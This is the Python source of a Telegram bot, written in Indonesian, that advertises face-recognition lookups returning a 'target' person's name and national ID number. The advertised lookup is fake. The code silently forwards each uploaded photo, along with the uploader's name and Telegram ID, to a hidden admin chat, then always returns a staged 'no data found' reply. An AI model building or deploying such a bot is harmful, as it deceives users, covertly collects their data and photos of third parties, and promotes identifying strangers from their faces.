import os
import asyncio
import logging
from datetime import datetime
from dotenv import load_dotenv

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# --- LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
try:
    ADMIN_ID = int(os.getenv("ADMIN_GROUP_ID").strip())
except:
    ADMIN_ID = None

# --- HANDLER START ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    welcome_text = (
        "SELAMAT DATANG\n\n"
        "**BOT FR TESTING**\n"
        "(KUOTA 10/DAY)\n\n"
        "**CARA PENGGUNAAN BOT**\n\n"
        "1. SILAHKAN MASUKKAN FOTO TARGET, UPAYAKAN FOTO TAMPAK DEPAN DAN TERLIHAT JELAS.\n\n"
        "2. SISTEM AKAN MELAKUKAN PENGECEKAN FR TARGET DALAM 10MENIT WAKTU TERCEPAT UNTUK MENDAPATKAN HASIL FR AKURASI TINGGI.\n\n"
        "3. BOT AKAN MENAMPILKAN HASIL NAMA, NIK, DAN PERSENTASE KEMIRIPAN DENGAN FOTO TARGET.\n\n"
        "4. BOT BERFUNGSI SAAT SERVER HIDUP DI PUKUL 06.00 WIB SAMPAI DENGAN PUKUL 21.00 WIB.\n\n"
        "5. GUNAKAN AKSES DENGAN BIJAK. TERIMAKASIH\n\n\n"
        "SELAMAT BERTUGAS, SEMOGA SUKSES SELALU"
    )
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

    # Notifikasi Start ke Admin (Hanya teks agar ringan)
    try:
        if ADMIN_ID:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"🚀 **USER START**\nNama: {user.full_name}\nID: `{user.id}`",
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"Gagal kirim log start: {e}")

# --- HANDLER FOTO ---
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Cek Jam Operasional
    now = datetime.now().hour
    if now < 6 or now > 21:
        await update.message.reply_text("⚠️ Server Offline. Bot aktif 06.00 - 21.00 WIB.")
        return

    user = update.message.from_user
    photo_id = update.message.photo[-1].file_id
    
    # Respons instan
    await update.message.reply_text("Sedang diproses...")

    # PROSES KIRIM KE ADMIN (DEBUG MODE)
    try:
        # Percobaan 1: Kirim sebagai Foto
        await context.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=photo_id,
            caption=f"📥 **LAPORAN FOTO BARU**\nUser: {user.full_name}\nID: `{user.id}`",
            parse_mode='Markdown'
        )
        logger.info("✅ Berhasil kirim foto ke grup.")
        
    except Exception as error_awal:
        # Jika gagal, kirim pesan error ke chat user agar kita tahu penyebabnya
        logger.error(f"Gagal kirim foto: {error_awal}")
        
        # Percobaan 2: Kirim sebagai Dokumen (File)
        try:
            await context.bot.send_document(
                chat_id=ADMIN_ID,
                document=photo_id,
                caption=f"📥 **LAPORAN (DOKUMEN)**\nUser: {user.full_name}",
                parse_mode='Markdown'
            )
            logger.info("✅ Berhasil kirim sebagai dokumen.")
        except Exception as error_kedua:
            # JIKA SEMUA GAGAL, berikan detail error ke user
            pesan_error = f"❌ **SISTEM GAGAL MENERUSKAN FOTO**\n\nDetail Error 1: `{error_awal}`\nDetail Error 2: `{error_kedua}`"
            await update.message.reply_text(pesan_error, parse_mode='Markdown')
            return

    # Simulasi hasil akhir
    await asyncio.sleep(4)
    await update.message.reply_text(
        "*HASIL PENGECEKAN FR*\n\n"
        "Nama : DATA TIDAK DITEMUKAN\n"
        "NIK  : -\n"
        "STATUS : TIDAK ADA DATA",
        parse_mode='Markdown'
    )

if __name__ == '__main__':
    if not TOKEN or not ADMIN_ID:
        print("❌ Periksa TOKEN/ID di .env!")
        exit()

    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))

    print(f"🚀 Bot Ready! Target Admin: {ADMIN_ID}")
    app.run_polling(drop_pending_updates=True)
